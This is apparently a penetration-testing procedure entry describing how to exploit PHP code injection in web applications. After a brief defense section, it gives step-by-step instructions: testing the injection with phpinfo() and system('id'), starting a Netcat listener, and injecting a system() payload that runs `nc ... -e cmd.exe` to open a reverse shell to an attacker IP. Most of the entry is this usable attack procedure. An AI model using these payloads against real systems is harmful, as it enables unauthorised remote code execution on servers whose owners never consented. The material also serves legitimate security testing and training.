---
type: procedure
verified: true
submitted: true
created_at: '2020-07-31T18:41:55.942812+00:00'
updated_at: '2023-05-26T01:31:02.487315+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
sub_techniques: []
tags:
  - injection
  - owasp
  - owasp-top-10
  - reverse-shell
  - web-applications
  - php
commands:
  - '[[commands/nc-windows-listener-for-reverse-shell]]'
tools:
  - '[[tools/Netcat]]'
platforms:
  - Web
validated: true
---

# Establish-Reverse-Shell-via-PHP-Code-Injection

## Summary

This procedure demonstrates how to exploit PHP code injection vulnerabilities in web applications to execute arbitrary commands, culminating in establishing a reverse shell connection back to the attacker's machine using Netcat. It is commonly used in penetration testing to gain remote code execution (RCE) on vulnerable web servers.

## Description

PHP code injection occurs when user input is not properly sanitized and is passed directly to PHP functions like system() or eval(), allowing attackers to inject and execute malicious PHP code. This technique targets web applications with insufficient input validation, such as contact forms, search fields, or file upload features. Once injection is confirmed, attackers can inject a payload to spawn a reverse shell, providing interactive command-line access to the target server. This procedure assumes the target is a PHP-based web application running on a Windows or Unix-like server, and focuses on using Netcat for the reverse connection. Success relies on the server having Netcat installed or accessible via system paths.

## Requirements

1. Access to a vulnerable web application with PHP code injection points (e.g., input fields that execute user input via system() or similar).
2. Attacker machine with Netcat installed for listening.
3. Network connectivity between attacker and target (firewall rules allowing outbound connections from target to attacker's IP/port).
4. Basic knowledge of PHP syntax and web request interception (e.g., via browser or proxy like Burp Suite).

## Defense

Defensive measures and detection strategies:

- Input validation and sanitization: Use prepared statements or whitelisting for all user inputs; avoid direct execution of user-supplied data in PHP functions like system() or eval().
- Web Application Firewall (WAF): Deploy WAF rules to detect and block common injection patterns (e.g., signatures for system(), nc, or reverse shell payloads).
- Logging and monitoring: Enable PHP error logging, web server access logs, and network intrusion detection to spot anomalous outbound connections or command executions.
- Principle of least privilege: Run web servers under non-privileged accounts without shell access; disable unnecessary functions in php.ini (e.g., disable_system).

## Objectives

1. Confirm PHP code injection vulnerability by executing a benign function like phpinfo().
2. Inject a reverse shell payload to establish command-line access.
3. Interact with the target system via the reverse shell for further exploitation.
4. Expected outcome: Interactive shell session on the attacker's listener, allowing command execution on the target.

## Instructions

### Step 1: Confirm PHP Code Injection Vulnerability

**Context**: Test for code injection by submitting a simple PHP function like phpinfo() through an input field. This verifies if user input is executed as PHP code without sanitization. Monitor the response for PHP configuration details, which indicates successful injection.

**Instructions**: Locate an input field (e.g., search box or form) in the web application. Submit the payload `<?php phpinfo(); ?>` or simply `phpinfo()` if the input is directly executed. Use a proxy tool to intercept and modify requests if needed.

> If the page outputs PHP version and configuration details, the vulnerability is confirmed. Otherwise, try variations like `<?php system('id'); ?>` to test command execution.

### Step 2: Set Up Listener on Attacker Machine

**Context**: Before injecting the reverse shell, start a Netcat listener on the attacker's machine to catch the incoming connection from the target. Use a high port like 9999 to avoid common blocks.

**Command** ([[commands/nc-windows-listener-for-reverse-shell]]):
```bash
nc.exe -lvp 9999
```

> This command binds Netcat to port 9999 in verbose mode, listening for TCP connections. Expected output includes a message like "listening on [any] 9999 ...". Keep this running while injecting the payload.

### Step 3: Inject Reverse Shell Payload

**Context**: Use the confirmed injection point to execute a system command that spawns a Netcat reverse shell. The payload calls PHP's system() function to run Netcat, connecting back to the attacker's listener with a Windows cmd.exe shell (adjust for Unix with /bin/sh if needed).

**Code** ([[codes/PHP-System-NC-Reverse-Shell]]):
```php
; system("nc 192.168.11.4 9999 -e cmd.exe")
```

> Submit this payload through the vulnerable input field. Replace `192.168.11.4` with your attacker's IP and `9999` with the listener port. Upon execution, the target will connect back, providing a shell. Verify by checking the listener for incoming connection and shell prompt.
